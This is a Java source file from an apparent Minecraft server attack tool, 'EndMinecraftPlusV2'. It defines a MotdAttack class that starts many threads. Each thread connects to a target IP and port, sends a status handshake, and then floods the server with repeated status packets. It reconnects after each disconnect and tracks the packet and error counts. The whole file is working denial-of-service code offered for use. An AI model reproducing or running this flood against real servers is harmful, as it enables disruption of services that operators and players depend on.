package cn.serendipityr.EndMinecraftPlusV2.AttackUtils.Methods;

import cn.serendipityr.EndMinecraftPlusV2.Tools.LogUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.OtherUtils;
import cn.serendipityr.EndMinecraftPlusV2.Tools.SetTitle;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class MotdAttack extends IAttack {
    public List<Thread> threads = new ArrayList<>();
    private int runTimes = 0;
    private int errorTimes = 0;
    public MotdAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void start() {
        Runnable task = () -> {
            while (true) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(ip, port));
                    if (socket.isConnected()) {
                        LogUtil.doLog(0, "正在发送Motd更新数据包...", "MotdAttack" + Thread.currentThread().getName());
                        OutputStream out = socket.getOutputStream();
                        out.write(new byte[] { 0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01 });
                        out.flush();
                        while (socket.isConnected()) {
                            for (int i = 0; i < 10; i++) {
                                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - MotdAttack | 总连接数: " + threads.size() + "个 | 发包次数: " + runTimes + "次 | 错误次数: " + errorTimes);
                                out.write(new byte[] { 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
                                        0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00 });
                                runTimes++;
                            }
                            out.flush();
                        }
                        try {
                            out.close();
                            socket.close();
                        } catch (IOException ignored) {}
                        LogUtil.doLog(0, "连接已断开。", "MotdAttack" + Thread.currentThread().getName());
                        OtherUtils.doSleep(attack_joinsleep);
                    }
                } catch (Throwable e) {
                    LogUtil.doLog(0, "发生错误: " + e.getMessage(), "MotdAttack" + Thread.currentThread().getName());
                    errorTimes++;
                }
            }
        };

        if (this.attack_maxconnect < 1)
            this.attack_maxconnect = 10;

        for (int i = 0; i < this.attack_maxconnect; i++) {
            Thread thread = new Thread(task);
            thread.setName(String.valueOf(i + 1));
            thread.start();
            threads.add(thread);
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        threads.forEach(Thread::stop);
    }

}
